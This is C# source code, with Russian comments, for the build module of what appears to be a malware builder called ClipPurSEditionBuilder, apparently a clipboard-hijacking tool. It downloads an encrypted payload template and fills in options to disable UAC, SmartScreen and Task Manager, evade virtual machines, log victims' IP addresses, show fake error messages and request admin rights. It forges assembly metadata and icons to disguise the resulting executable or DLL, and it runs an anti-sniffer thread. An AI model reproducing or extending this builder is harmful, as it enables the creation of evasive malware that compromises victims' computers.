using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using ClipPurSEditionBuilder.Properties;
using ClipPurSEditionBuilder.Sticks;
using Microsoft.CSharp;

namespace ClipPurSEditionBuilder
{
    public static class SourceEdition
    {
        // Контейнер в котором находятся все данные из других пользовательских интерфейсов
        public static Dictionary<string, string> values = new Dictionary<string, string>();

        // Список ссылок необходимые для работы билд файла
        private static readonly List<string> list_library = new List<string>
        {
            "System.dll",
            "System.Net.dll",
            "System.Management.dll",
            "System.Windows.Forms.dll",
            "System.Security.dll"
        };

        /// <summary>
        /// Метод для компиляции исходного кода
        /// </summary>
        /// <param name="values">Данные из словаря (контейнера)</param>
        /// <param name="build">Передача данных через свойства</param>
        /// <returns>Исходно-изменённый файл</returns>
        public static bool Inizialize(Dictionary<string, string> values, Build build)
        {
            // Запускаем антисниффер
            new Thread(() => { AntiSniffer.Inizialize(); }).Start();
            // Расшифровываем онлайн билд через ключ
            string SourceCode = INetConnect.GetOnlineBuild(EncryptKey.Decrypt(GlobalPath.DatabaseBuild, GlobalPath.SecretKey_Public));

            #region ComboBox replace Boolean values

            SourceCode = build.DelayCheckStatus.Checked ? SourceCode.Replace("[Delay]", "true") : SourceCode.Replace("[Delay]", "false");
            SourceCode = build.RunCheckStatus.Checked ? SourceCode.Replace("[Run]", "true") : SourceCode.Replace("[Run]", "false");
            SourceCode = build.GarbageCheckStatus.Checked ? SourceCode.Replace("[Garbage]", "true") : SourceCode.Replace("[Garbage]", "false");
            SourceCode = build.UacOffCheckStatus.Checked ? SourceCode.Replace("[Uac]", "true") : SourceCode.Replace("[Uac]", "false");
            SourceCode = build.SmartOffCheckStatus.Checked ? SourceCode.Replace("[Smart]", "true") : SourceCode.Replace("[Smart]", "false");
            SourceCode = build.TaskMgrOffCheckStatus.Checked ? SourceCode.Replace("[TaskLock]", "true") : SourceCode.Replace("[TaskLock]", "false");
            SourceCode = build.AntiVMCheckStatus.Checked ? SourceCode.Replace("[Anti]", "true") : SourceCode.Replace("[Anti]", "false");
            SourceCode = build.IPLogheckStatus.Checked ? SourceCode.Replace("[IPloger]", "true") : SourceCode.Replace("[IPloger]", "false");
            SourceCode = build.FakeErrorCheckStatus.Checked ? SourceCode.Replace("[Fake]", "true") : SourceCode.Replace("[Fake]", "false");

            #endregion

            SourceCode = SourceCode.Replace("[TEXT_ERROR]", build.ErrorBox);

            #region Replacement Assembly

            SourceCode = SourceCode.Replace("[TITLE]", build.AssTitle).
                                    Replace("[DESCRIPTION]", build.AssDescription).
                                    Replace("[COMPANY]", build.AssCompany).
                                    Replace("[PRODUCT]", build.AssProduct).
                                    Replace("[COPYRIGHT]", build.AssCopyright).
                                    Replace("[VERSION]", build.AssVersion).
                                    Replace("[FILEVERSION]", build.AssFileVersion).
                                    Replace("[GUID]", build.GuidBox).
                                    Replace("[WEB]", build.IPLoGGeR);

            #endregion

            #region Replace data user interfaces

            foreach (KeyValuePair<string, string> kvp in values)
            {
                SourceCode = SourceCode?.Replace(kvp.Key, kvp.Value);
            }

            #endregion

            // Версия .Net Framework для билда
            var providerOptions = new Dictionary<string, string> { { "CompilerVersion", "v4.0" } };

            // Инициализация нового экземпляра класса CSharpCodeProvider
            using (var provider = new CSharpCodeProvider(providerOptions))
            {
                try
                {
                    // Дефолтные параметры для компиляции
                    var parameters = new CompilerParameters
                    {
                        CompilerOptions = "/target:winexe /optimize+ /platform:anycpu", // Дополнительные параметры для компиляции
                        TreatWarningsAsErrors = false,
                        GenerateInMemory = false,
                        IncludeDebugInformation = false,
                    };
                    switch (build.ComboOutputExtension.SelectedItem.ToString().Trim())
                    {
                        case ".dll":
                            {
                                parameters.OutputAssembly += $"{build.BoxFileName}.exe"; // Выходной файл .dll ( изначальный .exe после обфускации в .dll ) 
                                parameters.GenerateExecutable = false;
                            }
                            break;
                        default:
                            parameters.OutputAssembly += $"{build.BoxFileName}.exe"; // Выходной файл .exe
                            parameters.GenerateExecutable = true;  // Генерация в .exe
                            break;
                    }
                    if (!string.IsNullOrEmpty(build.BoxIcon) || FileControl.ExistsFile(build.BoxIcon)) // Проверка на обнаружение иконки
                    {
                        parameters.CompilerOptions += $" /win32icon:{build.BoxIcon}"; // Добавляем иконку
                    }
                    if (build.RunCheckStatus.Checked) // Проверка запуска от Админа
                    {
                        if (FileControl.ExistsFile(GlobalPath.ManifestFile)) // Проверка файла app.Manifest
                        {
                            parameters.CompilerOptions += $" /win32manifest:{GlobalPath.ManifestFile}"; // внедряем запуск от Админа
                        }
                        else
                        {
                            MusicPlay.Inizialize(Resources.Error_Build);
                            if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                            {
                                ControlActive.CheckMessage(build.BoxStatus, Language.GlobalMessageStrings_en_US.FindManifest);
                            }
                            else
                            {
                                ControlActive.CheckMessage(build.BoxStatus, Language.GlobalMessageStrings_ru_RU.FindManifest);
                            }
                        }
                    }

                    // Добавление ссылок для компиляции билда
                    #region Add Library Dll

                    for (int i = 0; i < list_library.Count; i++)
                    {
                        parameters.ReferencedAssemblies.Add(list_library[i]);
                    }

                    #endregion

                    // Компиляция!
                    CompilerResults ResultLog = provider.CompileAssemblyFromSource(parameters, SourceCode);

                    // Проверка на ошибки
                    if (!ResultLog.Errors.HasErrors)
                    {
                        SourceCode = null;
                        ResultLog = null;

                        FileControl.FileDelete("Error_Compiler.txt");
                        MusicPlay.Inizialize(Resources.GoodBuild);

                        if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                        {
                            ControlActive.CheckMessage(build.BoxStatus, Language.GlobalMessageStrings_en_US.BuildCreated);
                        }
                        else
                        {
                            ControlActive.CheckMessage(build.BoxStatus, Language.GlobalMessageStrings_ru_RU.BuildCreated);
                        }

                        string tte = FileControl.CombinePath(GlobalPath.CurrDir, $"{build.BoxFileName}.exe");

                        // Расширения для билд файла
                        switch (build.ComboOutputExtension.SelectedIndex)
                        {
                            case 1: FileControl.Move(tte, Path.ChangeExtension(tte, ".dll")); break;
                            default: FileControl.Move(tte, Path.ChangeExtension(tte, ".exe")); break;
                        }          
                        return true;
                    }
                    else
                    {
                        MusicPlay.Inizialize(Resources.Error_Build);
                        // Проходимся циклом чтобы перечислить все ошибки которые возникли и записать их в файл .txt
                        foreach (CompilerError compilerError in ResultLog.Errors)
                        {
                            if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                            {
                                FileControl.CreateFile("Error_Compiler.txt", $"Error: {compilerError.ToString()} \r\nLine: {compilerError.Line}\r\n");
                            }
                            else
                            {
                                FileControl.CreateFile("Error_Compiler.txt", $"Ошибка: {compilerError.ToString()} \r\nСтрока: {compilerError.Line}\r\n");
                            }
                        }
                        return false;
                    }
                }
                catch (Exception ex) // Остальные (неизвестные ошибки) записать в файл .txt
                {
                    MusicPlay.Inizialize(Resources.Error_Build);
                    if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                    {
                        ControlActive.CheckMessage(build.BoxStatus, Language.GlobalMessageStrings_en_US.ErrorBuild);
                        FileControl.CreateFile("Compile_Error.txt", $"Error: {ex.Message}\r\n");
                    }
                    else
                    {
                        ControlActive.CheckMessage(build.BoxStatus, Language.GlobalMessageStrings_ru_RU.ErrorBuild);
                        FileControl.CreateFile("Compile_Error.txt", $"Ошибка: {ex.Message}\r\n");
                    }
                    return false;
                }
            }
        }
    }
}